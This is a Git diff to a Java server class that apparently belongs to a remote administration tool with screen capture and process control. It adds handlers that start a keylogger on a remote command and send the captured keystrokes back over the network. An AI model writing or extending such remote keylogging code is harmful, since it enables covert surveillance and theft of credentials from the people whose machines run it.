@@ -3,6 +3,7 @@ package Function;
 import java.net.*;
 
 import Application.Server_GUI;
+import KeyLogger.KeyLogger;
 import ScreenCapture.ScreenCapture;
 import process.ListProcess;
 import process.ProcessKill;
@@ -79,13 +80,15 @@ public class ActionThread extends Thread {
 				main.actionRecorded(fromIP, record);
 			}
 
-//			else if (request.equals("KEY_LOGGER_START")) {
-//
-//			} 
-//			
-//			else if (request.equals("KEY_LOGGER_STOP")) {
-//
-//			} 
+			else if (request.equals("KEY_LOGGER_START")) {
+				KeyLogger keyLogger = new KeyLogger(oos, "");
+				keyLogger.get_Keylogger(oos);
+			} 
+		
+			else if (request.equals("KEY_LOGGER_STOP")) {
+				KeyLogger keyLogger = new KeyLogger(oos, "");
+				keyLogger.send_KeyLogger();
+			} 
 
 			else if (request.equals("SCREEN_CAPTURE")) {
 				ScreenCapture screenCapture = new ScreenCapture(oos);
